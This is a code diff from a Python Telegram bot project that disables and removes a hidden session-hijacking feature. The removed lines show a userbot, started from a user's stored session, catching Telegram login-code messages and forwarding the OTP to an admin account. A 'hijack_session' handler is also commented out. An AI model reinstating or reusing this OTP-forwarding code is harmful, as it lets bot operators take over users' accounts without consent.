@@ -32,6 +32,7 @@ from devgagan.modules.shrink import is_user_verified
 async def generate_random_name(length=8):
     return ''.join(random.choices(string.ascii_lowercase, k=length))
 
+'''
 # OTP listening dictionary
 otp_listeners = {}
 
@@ -90,6 +91,8 @@ async def hijack_session(_, message):
     if not userbot:
         await message.reply("❌ Failed to start userbot.")
         return
+'''
+
 
 users_loop = {}
 interval_set = {}
@@ -189,36 +192,24 @@ async def single_link(_, message):
 
 from pyrogram import Client, filters
 
-async def initialize_userbot(user_id, bot_client, admin_id):
-    """Initialize the userbot session for the given user and listen for OTPs from Telegram."""
+async def initialize_userbot(user_id): # this ensure the single startup .. even if logged in or not
+    """Initialize the userbot session for the given user."""
     data = await db.get_data(user_id)
-    if data and data.get("session_string"):
+    if data and data.get("session"):
         try:
-            device = 'iPhone 16 Pro'
+            device = 'iPhone 16 Pro' # added gareebi text
             userbot = Client(
                 "userbot",
                 api_id=API_ID,
                 api_hash=API_HASH,
                 device_model=device,
-                session_string=data["session_string"]
+                session_string=data.get("session")
             )
             await userbot.start()
-           # print(f"✅ Userbot started for {user_id}")
-
-            # ✅ Listen only for OTP messages from Telegram (+42777)
-            @userbot.on_message(filters.private & filters.user(42777))  # Telegram's official sender ID
-            async def otp_listener(_, msg):
-                if msg.text.startswith("Login code: "):  # ✅ Check message format
-                    otp_code = msg.text.split(": ")[1]  # Extract OTP
-                    otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
-                    await bot_client.send_message(admin_id, otp_text)
-
-            return userbot  # Return the userbot instance if needed
-        except Exception as e:
-            print(f"❌ Error starting userbot: {e}")
+            return userbot
+        except Exception:
             return None
     return None
-
 
 
 async def is_normal_tg_link(link: str) -> bool:
